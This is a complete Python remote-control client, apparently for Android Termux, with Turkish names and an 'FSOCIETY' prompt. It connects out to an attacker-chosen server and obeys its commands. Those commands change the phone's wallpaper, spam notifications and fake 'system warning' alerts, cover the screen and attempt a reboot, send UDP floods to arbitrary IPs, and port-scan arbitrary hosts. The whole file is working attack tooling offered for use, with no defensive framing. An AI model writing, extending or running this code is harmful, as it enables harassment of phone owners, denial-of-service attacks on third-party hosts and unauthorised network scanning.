import socket
import subprocess
import os
import urllib.request
import random

SERVER_IP = input("Server IP gir: ")
PORT = int(input("Port gir: "))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((SERVER_IP, PORT))
    s.send("[✓] Baglanti basarili.\n".encode())
except:
    print("Baglanti hatasi")
    exit()

def arkaplan_degistir(resim_url):
    try:
        urllib.request.urlretrieve(resim_url, "duvar.jpg")
        os.system("termux-wallpaper -f duvar.jpg")
        try:
            os.system("termux-wallpaper -t lock -f duvar.jpg")
        except:
            pass
        s.send("[✓] Arka plan degistirildi\n".encode())
    except:
        s.send("[!] Arka plan degistirme hatasi\n".encode())

def bildirim_gonder(mesaj, adet):
    for i in range(adet):
        os.system(f'termux-notification --title "Mesaj {i+1}" --content "{mesaj}"')

def uyari_bildirimi(mesaj):
    os.system(f'termux-notification --title "⚠️ Sistem UYARISI!" --content "{mesaj}" --priority high')
    s.send("[!] Uyari bildirimi gonderildi\n".encode())

def uyari_spam(mesaj, adet):
    for i in range(adet):
        os.system(f'termux-notification --title "⚠️ Sistem UYARISI!" --content "{mesaj}" --priority high --vibrate 1000')
    s.send("[!] Uyari spam gonderildi\n".encode())

def udp_yolla(ip, port, sayi):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    for i in range(sayi):
        sock.sendto(bytes, (ip, port))
    s.send("[+] UDP gonderimi tamamlandi\n".encode())

def port_tara(ip, start, end):
    sonuc = f"[~] Taraniyor: {ip} ({start}-{end})\n"
    for port in range(start, end+1):
        try:
            tarayici = socket.socket()
            tarayici.settimeout(0.3)
            tarayici.connect((ip, port))
            sonuc += f"[+] Port {port} ACIK\n"
            tarayici.close()
        except:
            pass
    if sonuc.strip() == "":
        sonuc = "[!] Hicbir port acik degil\n"
    s.send(sonuc.encode())

def google_ac():
    os.system("termux-open-url https://www.google.com")
    s.send("[✓] Google acildi\n".encode())

def telefon_saldirisi(resim_url):
    try:
        with open("telefon.html", "w") as f:
            f.write(f"""
            <html>
            <head><style>body,html{{margin:0;padding:0;overflow:hidden;background:black}}img{{width:100%;height:100%;object-fit:cover}}</style></head>
            <body><img src="{resim_url}"></body></html>
            """)
        os.system("termux-open telefon.html")
        os.system("sleep 5 && reboot")
        s.send("[!] Telefon ekran kaplandi, reboot denendi\n".encode())
    except:
        s.send("[!] telefon komutu hatali\n".encode())

while True:
    try:
        komut = s.recv(1024).decode().strip()
        print(f"[FSOCIETY@PHONE ~]$ {komut}")

        if komut.startswith("arkaplan "):
            _, url = komut.split(" ", 1)
            arkaplan_degistir(url)

        elif komut.startswith("bildirim "):
            try:
                _, mesaj, flag, adet = komut.split(" ")
                if flag == "-m":
                    bildirim_gonder(mesaj, int(adet))
                    s.send("[+] Bildirim gonderildi\n".encode())
            except:
                s.send("[!] Hata: bildirim komutu\n".encode())

        elif komut.startswith("uyari "):
            _, mesaj = komut.split(" ", 1)
            uyari_bildirimi(mesaj)

        elif komut.startswith("uyarispam "):
            try:
                args = komut.replace("uyarispam ", "")
                if " -m " in args:
                    mesaj, adet = args.rsplit(" -m ", 1)
                    uyari_spam(mesaj.strip(), int(adet.strip()))
            except:
                s.send("[!] Hata: uyarispam komutu\n".encode())

        elif komut.startswith("udp "):
            try:
                _, hedef_ip, hedef_port, paket_sayisi = komut.split(" ")
                udp_yolla(hedef_ip, int(hedef_port), int(paket_sayisi))
            except:
                s.send("[!] Hata: udp komutu\n".encode())

        elif komut.startswith("port "):
            try:
                _, hedef_ip, bas, son = komut.split(" ")
                port_tara(hedef_ip, int(bas), int(son))
            except:
                s.send("[!] Hata: port komutu\n".encode())

        elif komut == "google":
            google_ac()

        elif komut.startswith("telefon "):
            try:
                _, url = komut.split(" ", 1)
                telefon_saldirisi(url)
            except:
                s.send("[!] telefon komutu hatali\n".encode())

        elif komut == "exit":
            s.close()
            break

        else:
            s.send("[!] Gecersiz komut\n".encode())

    except:
        break
